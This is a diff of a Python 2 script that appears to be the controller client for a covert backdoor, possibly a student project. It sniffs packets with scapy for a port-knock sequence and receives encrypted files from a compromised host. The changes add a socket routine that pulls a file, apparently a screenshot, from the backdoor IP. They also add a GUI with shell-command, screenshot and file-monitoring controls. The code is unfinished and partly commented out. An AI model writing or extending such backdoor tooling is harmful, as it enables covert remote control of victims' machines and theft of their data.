@@ -23,8 +23,9 @@ from subprocess import *
 from Crypto.Cipher import AES
 import ConfigParser
 from multiprocessing import Process
+from Tkinter import *
 
-
+text = ""
 results = ""
 resultsForFiles = ""
 fileIP = ""
@@ -123,44 +124,48 @@ def recvFile(packet):
 		print "\nChecking Knock Sequence"
 		knock(packet)
 		
+	
 	#check packet if has IP/Raw layer and also that authentication is passed
-	if packet.haslayer(IP) and state is 3 and packet.haslayer(Raw):
+	if state is 3:
 		
+		time.sleep(2)
 		#if the IP does not match the authenticated IP
 		if packet[IP].src != fileIP:
 			print "IP didn't match" + "source" + packet[IP].src + "fileIP" + fileIP
 			return
 			
 		#check if the IP matches the backdoor IP
-		if packet[IP].src == configReader.destIP:
+		#if packet[IP].src == configReader.destIP:
 		
 			#load the packet content
-			resultsForFiles = packet[Raw].load
+		#	resultsForFiles = packet[Raw].load
 			
-			if packet.haslayer(Raw):
+		#	if packet.haslayer(Raw):
 				
-				#if the load has the password embedded
-				if packet[Raw].load.find(configReader.password):
+		#		#if the load has the password embedded
+		#		if packet[Raw].load.find(configReader.password):
+		#			
+		#			#remove the password to get the rest of the content
+		#			resultsForFiles.strip(configReader.password)
+		#			resultsForFiles = resultsForFiles[:-8]
+		#			
+		#			#debugging purposes
+		#			print resultsForFiles
+		#			
+		#			#decrypt the contents and write the files
+		#			decryptedData = encryption.decryption(resultsForFiles)
+		#			fileName, fileData = decryptedData.split("\0",1)
+		#			fileDescriptor = open(fileName, 'wb')
+		#			fileDescriptor.write(fileData)
+		#			resultsForFiles = ""
+		recvPhoto()
+		state = 0 #reset state for new knock
 					
-					#remove the password to get the rest of the content
-					resultsForFiles.strip(configReader.password)
-					resultsForFiles = resultsForFiles[:-8]
-					
-					#debugging purposes
-					print resultsForFiles
-					
-					#decrypt the contents and write the files
-					decryptedData = encryption.decryption(resultsForFiles)
-					fileName, fileData = decryptedData.split("\0",1)
-					fileDescriptor = open(fileName, 'wb')
-					fileDescriptor.write(fileData)
-					resultsForFiles = ""
-					state = 0 #reset state for new knock
-					
-def recvPhoto(packet):
+def recvPhoto():
 	
-	s = socket.socket()             # Create a socket object
-	host = socket.gethostname()     # Get local machine name
+	s = socket.socket()     
+	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)        # Create a socket object
+	host = configReader.destIP     # Get local machine name
 	port = 60000                    # Reserve a port for your service.
 
 	s.connect((host, port))
@@ -178,9 +183,10 @@ def recvPhoto(packet):
 			f.write(data)
 
 	f.close()
-	print('Successfully get the file')
+	
+	print('Successfully received file')
 	s.close()
-	print('connection closed')
+	print('Connection closed')
 					
 #  =================================================================
 #  name: sniffFile
@@ -196,10 +202,7 @@ def sniffFile():
 	while True:
 		sniff(filter='{0} and dst port 6000'.format(configReader.protocol), prn=recvFile, count=1)
 		
-def sniffPhoto()
-	while True:
-		sniff(filter='{0} and dst port 6000'.format(configReader.prtocol), prn=recvPhoto, count=1)
-	
+
 #  =================================================================
 #  name: sniffCmd
 #  @param:
@@ -271,7 +274,56 @@ def knock(packet):
 				print "Connection Accepted"
 			else:
 				print "Wrong Port Knock Sequence"
-				state = 0				
+				state = 0	
+				
+def UI(tkRoot):
+	global text
+	
+	root = tkRoot
+	root.title("Client")
+	root.geometry('{}x{}'.format(1200, 1080))
+	
+	
+	#Input
+	buttonFrame = Frame(root)
+	buttonFrame.grid_rowconfigure(0,weight=1)
+	buttonFrame.grid_columnconfigure(0,weight=1)
+	
+	#Entr
+	
+	b1 = Button(root, text='Shell Command',font=("Helvetica", 10),  command=(), width=15)
+	b1.grid(row=0, column=2)
+	
+	b2 = Button(root, text='Screenshot',font=("Helvetica", 10), command=(),width=15)
+	b2.grid(row=1, column=2)
+	
+	b3 = Button(root, text='Monitor File',font=("Helvetica", 10), command=(),width=15)
+	b3.grid(row=2, column=2)
+	
+	b2 = Button(root, text='Stop Monitor',font=("Helvetica", 10), command=(),width=15)
+	b2.grid(row=3, column=2)
+	
+	lab = Label(root, font=("Helvetica", 10), text ="Input: " , anchor ='w')
+	ent = Entry(root,font=("Helvetica", 10),width=50)
+	ent.config(highlightbackground = "gray")
+
+	
+	text = Text(root, state='disabled',width=50,font=("Helvetica", 10))
+	text.configure(state='normal')
+	text.insert('end', 'Some Text')
+	text.configure(state='disabled')
+	text.grid(row=1,column=1,rowspan=100)
+	
+	lab.grid(row=0,column=0, padx=(25,10),pady=15)
+	ent.grid(row=0,column=1,sticky=N+S+W+E,padx=30,pady=15)
+	
+	
+	
+	#row.pack(side=TOP, fill=X, padx=5, pady=5)
+	#lab.pack(side=LEFT)
+	#ent.pack(side=TOP,expand=YES, fill=X)
+
+	root.mainloop()			
 
 
 #  =================================================================
@@ -286,18 +338,19 @@ def knock(packet):
 def main():
 	global fileIP
 	verify_root()
+	
+	
+	#root = Tk()
+	#UI(root)
+	
 	#commented out for faster debugging
 	#helpers.portKnock(configReader.destIP)
 
-	#temporary photo process
-	photoProcess = Process(target=sniffPhoto)
-	photoProcess.daemon = True
-	photoProcess.start()
-	
+
 	#sniffing file process
-	#fileProcess = Process(target=sniffFile)
-	#fileProcess.daemon = True
-	#fileProcess.start()
+	fileProcess = Process(target=sniffFile)
+	fileProcess.daemon = True
+	fileProcess.start()
 	
 	#sniffing for command process
 	cmdProcess = Process(target=sniffCmd)
